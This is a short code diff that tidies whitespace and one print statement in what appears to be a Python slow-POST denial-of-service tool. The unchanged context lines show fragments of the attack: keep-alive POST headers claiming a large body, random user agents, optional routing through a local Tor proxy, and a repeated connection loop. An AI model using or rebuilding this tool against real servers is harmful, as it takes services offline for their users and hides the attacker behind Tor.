@@ -37,7 +37,7 @@ class httpPost(Thread):
                         "Connection: keep-alive\r\n"
                         "Keep-Alive: 900\r\n"
                         "Content-Length: 10000\r\n"
-                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
+                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                         (self.host, random.choice(useragents)))
 
         for i in range(0, 9999):
@@ -55,7 +55,7 @@ class httpPost(Thread):
         while self.running:
             while self.running:
                 try:
-                    if self.tor:     
+                    if self.tor:
                         self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                     self.socks.connect((self.host, self.port))
                     print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
@@ -135,7 +135,7 @@ def main(argv):
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
         except KeyboardInterrupt:
-            print "\nShutting down threads...\n"
+            print ("\nShutting down threads...\n")
             for t in rthreads:
                 stop_now = True
                 t.running = False
